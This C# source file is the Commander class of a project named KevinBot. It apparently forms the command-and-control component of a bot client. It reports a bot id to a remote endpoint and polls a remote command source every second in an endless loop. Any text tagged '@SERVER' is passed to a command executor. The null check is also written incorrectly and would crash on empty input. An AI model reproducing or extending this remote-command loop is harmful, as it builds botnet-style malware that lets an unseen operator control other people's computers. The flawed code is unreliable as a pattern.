using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Collections.Specialized;
using KevinBot.App;
using KevinBot.Properties;

namespace KevinBot.Network
{
    class Commander
    {
        Settings S = new Settings();
        Functions Func = new Functions();
        Config Cfg = new Config();
        BotCommander bCmdr = new BotCommander();

        public void Update(string cmd)
        {
            NameValueCollection C = new NameValueCollection();
            C.Add("id", S.id);
            C.Add("cmd", cmd);
            Func.UploadValues(C, Cfg.SetCommander);
        }
        public void Enable()
        {
            Thread R = new Thread(Reader);
            R.Start();
        }

        private void Reader()
        {
            char Splitter = '~';
            string[] user = null;
            string Command = null;
            do
            {
                Command = Func.ReadFileContents(Cfg.GetCommander);
                if (Command != null || Command.Length > 0)
                {
                    user = Command.Split(Splitter);
                    if (user[0] == "@SERVER")
                    {
                        string full = null;
                        for (int i = 1; i <= user.Count() -1; i++)
                        {
                            if (i != user.Count() - 1)
                                full += user[i] + "~";
                            else
                                full += user[i];

                        }
                        System.Windows.Forms.MessageBox.Show(full);
                        bCmdr.Execute(full);
                    }
                }
                Thread.Sleep(1000); // 1 Seccond
            } while (true);
        }
    }
}
